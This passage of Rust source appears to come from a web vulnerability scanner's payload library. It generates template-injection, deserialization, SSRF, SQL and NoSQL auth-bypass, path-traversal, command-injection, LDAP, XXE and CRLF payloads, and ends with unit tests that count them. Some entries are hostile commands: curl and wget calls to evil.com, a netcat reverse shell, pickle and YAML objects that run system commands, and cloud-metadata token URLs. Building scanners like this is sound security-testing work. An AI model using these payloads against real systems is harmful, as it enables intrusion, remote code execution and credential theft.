    // Freemarker
    payloads.extend(vec![
        "${7*7}".to_string(),
        r#"<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }"#.to_string(),
    ]);

    // Twig
    payloads.extend(vec![
        "{{7*7}}".to_string(),
        "{{_self}}".to_string(),
        "{{app}}".to_string(),
        "{{dump(app)}}".to_string(),
    ]);

    // Smarty
    payloads.extend(vec![
        "{$smarty.version}".to_string(),
        r#"{php}echo `id`;{/php}"#.to_string(),
    ]);

    payloads
}

/// Generate Deserialization attack payloads (200+)
pub fn generate_deserialization_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Java ysoserial payloads - Base64 encoded serialized objects
    payloads.extend(vec![
        // CommonsCollections1
        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAAZ3K".to_string(),

        // .NET BinaryFormatter - Base64 encoded
        "AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABxTeXN0ZW0uRGF0YS5EYXRhU2V0RGVyaWFiaQ==".to_string(),
    ]);

    // PHP serialize payloads
    payloads.extend(vec![
        r#"O:8:"stdClass":1:{s:4:"test";s:4:"data";}"#.to_string(),
        r#"O:4:"Evil":1:{s:7:"command";s:6:"whoami";}"#.to_string(),
        r#"a:2:{i:0;s:4:"test";i:1;s:4:"test";}"#.to_string(),
    ]);

    // Python pickle payloads
    payloads.extend(vec![
        r#"cos\nsystem\n(S'whoami'\ntR."#.to_string(),
        r#"c__builtin__\nexec\n(S'import os;os.system("whoami")'\ntR."#.to_string(),
        r#"c__builtin__\neval\n(S'__import__("os").system("whoami")'\ntR."#.to_string(),
    ]);

    // PyYAML
    payloads.push(r#"!!python/object/apply:os.system ['whoami']"#.to_string());

    // Node.js node-serialize
    payloads.push(
        r#"{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()"}"#
            .to_string(),
    );

    // .NET JSON.NET TypeNameHandling
    payloads.push(
        r#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#.to_string(),
    );

    payloads
}

/// Generate Open Redirect payloads
pub fn generate_open_redirect_payloads() -> Vec<String> {
    vec![
        "https://evil.com".to_string(),
        "//evil.com".to_string(),
        "/\\evil.com".to_string(),
        "https:evil.com".to_string(),
        "//google.com".to_string(),
        "//www.google.com".to_string(),
        "javascript:alert(1)".to_string(),
        "data:text/html,<script>alert(1)</script>".to_string(),
        "\\\\evil.com".to_string(),
        "@evil.com".to_string(),
    ]
}

/// Generate Enhanced SSRF payloads
pub fn generate_ssrf_payloads() -> Vec<String> {
    vec![
        "http://localhost".to_string(),
        "http://127.0.0.1".to_string(),
        "http://127.0.0.1:80".to_string(),
        "http://127.0.0.1:443".to_string(),
        "http://127.0.0.1:22".to_string(),
        "http://127.0.0.1:3306".to_string(),
        "http://0.0.0.0".to_string(),
        "http://[::]:80".to_string(),
        "http://169.254.169.254/latest/meta-data/".to_string(),
        "http://169.254.169.254/latest/user-data/".to_string(),
        "http://metadata.google.internal/computeMetadata/v1/".to_string(),
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
        "file:///etc/passwd".to_string(),
        "file:///c:/windows/win.ini".to_string(),
        "dict://localhost:11211/stat".to_string(),
        "gopher://127.0.0.1:25/".to_string(),
        "sftp://127.0.0.1:22/".to_string(),
    ]
}

/// Generate Auth Bypass payloads
pub fn generate_auth_bypass_payloads() -> Vec<String> {
    vec![
        "admin' --".to_string(),
        "admin' #".to_string(),
        "admin'/*".to_string(),
        "' or 1=1--".to_string(),
        "' or 1=1#".to_string(),
        "' or 1=1/*".to_string(),
        "admin' or '1'='1".to_string(),
        "') or ('1'='1".to_string(),
        "admin' order by 1--".to_string(),
        r#"{"username":"admin","password":{"$ne":null}}"#.to_string(),
    ]
}

/// Generate Enhanced Path Traversal payloads
pub fn generate_enhanced_path_traversal_payloads() -> Vec<String> {
    vec![
        "../".to_string(),
        "..\\".to_string(),
        "../../../etc/passwd".to_string(),
        "..\\..\\..\\windows\\win.ini".to_string(),
        "....//....//....//etc/passwd".to_string(),
        "....\\\\....\\\\....\\\\windows\\\\win.ini".to_string(),
        "..%2f..%2f..%2fetc%2fpasswd".to_string(),
        "..%5c..%5c..%5cwindows%5cwin.ini".to_string(),
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini".to_string(),
        "..;/..;/..;/etc/passwd".to_string(),
        "../../../../../../etc/passwd".to_string(),
        "../../../../../../windows/win.ini".to_string(),
        "/var/www/../../etc/passwd".to_string(),
        "C:\\..\\..\\..\\windows\\win.ini".to_string(),
    ]
}

/// Generate Enhanced Command Injection payloads
pub fn generate_enhanced_command_injection_payloads() -> Vec<String> {
    vec![
        "; ls -la".to_string(),
        "| ls -la".to_string(),
        "& ls -la".to_string(),
        "&& ls -la".to_string(),
        "|| ls -la".to_string(),
        "` ls -la`".to_string(),
        "$( ls -la )".to_string(),
        "; cat /etc/passwd".to_string(),
        "| cat /etc/passwd".to_string(),
        "&& cat /etc/passwd".to_string(),
        "; ping -c 5 127.0.0.1".to_string(),
        "| ping -c 5 127.0.0.1".to_string(),
        "; sleep 5".to_string(),
        "| sleep 5".to_string(),
        "`sleep 5`".to_string(),
        "$(sleep 5)".to_string(),
        "; curl http://evil.com".to_string(),
        "| curl http://evil.com".to_string(),
        "; wget http://evil.com/shell.sh".to_string(),
        "; nc -e /bin/sh 127.0.0.1 4444".to_string(),
    ]
}

/// Generate LDAP Injection payloads
pub fn generate_ldap_payloads() -> Vec<String> {
    vec![
        "*".to_string(),
        "*)(&".to_string(),
        "*)(uid=*))(|(uid=*".to_string(),
        "admin*".to_string(),
        "admin*)((|userPassword=*".to_string(),
        "*)(objectClass=*".to_string(),
        "*))(|(objectClass=*".to_string(),
    ]
}

/// Generate XXE (XML External Entity) payloads
pub fn generate_xxe_payloads() -> Vec<String> {
    vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
    ]
}

/// Generate CRLF Injection payloads
pub fn generate_crlf_payloads() -> Vec<String> {
    vec![
        "%0d%0aSet-Cookie:admin=true".to_string(),
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK".to_string(),
        "\\r\\nSet-Cookie:admin=true".to_string(),
        "%0d%0aLocation:http://evil.com".to_string(),
        "\\r\\nLocation:http://evil.com".to_string(),
    ]
}

/// Get ALL advanced payloads combined
pub fn get_all_advanced_payloads() -> Vec<String> {
    let mut all_payloads = Vec::new();

    all_payloads.extend(generate_jwt_payloads());
    all_payloads.extend(generate_nosql_payloads());
    all_payloads.extend(generate_ssti_payloads());
    all_payloads.extend(generate_deserialization_payloads());
    all_payloads.extend(generate_open_redirect_payloads());
    all_payloads.extend(generate_ssrf_payloads());
    all_payloads.extend(generate_auth_bypass_payloads());
    all_payloads.extend(generate_enhanced_path_traversal_payloads());
    all_payloads.extend(generate_enhanced_command_injection_payloads());
    all_payloads.extend(generate_ldap_payloads());
    all_payloads.extend(generate_xxe_payloads());
    all_payloads.extend(generate_crlf_payloads());

    all_payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xss_payload_count() {
        let payloads = get_all_xss_payloads();
        assert!(
            payloads.len() > 90000,
            "Expected 100K+ XSS payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_sqli_payload_count() {
        let payloads = get_all_sqli_payloads();
        assert!(
            payloads.len() > 20000,
            "Expected 20K+ SQLi payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_fast_mode_filtering() {
        let all_xss = get_all_xss_payloads();
        let fast_xss = get_xss_payloads("fast");
        assert!(
            fast_xss.len() < all_xss.len() / 50,
            "Fast mode should use ~1% of payloads"
        );
    }

    #[test]
    fn test_comprehensive_mode() {
        let all_xss = get_all_xss_payloads();
        let comprehensive_xss = get_xss_payloads("comprehensive");
        assert_eq!(
            all_xss.len(),
            comprehensive_xss.len(),
            "Comprehensive mode should use all payloads"
        );
    }
}
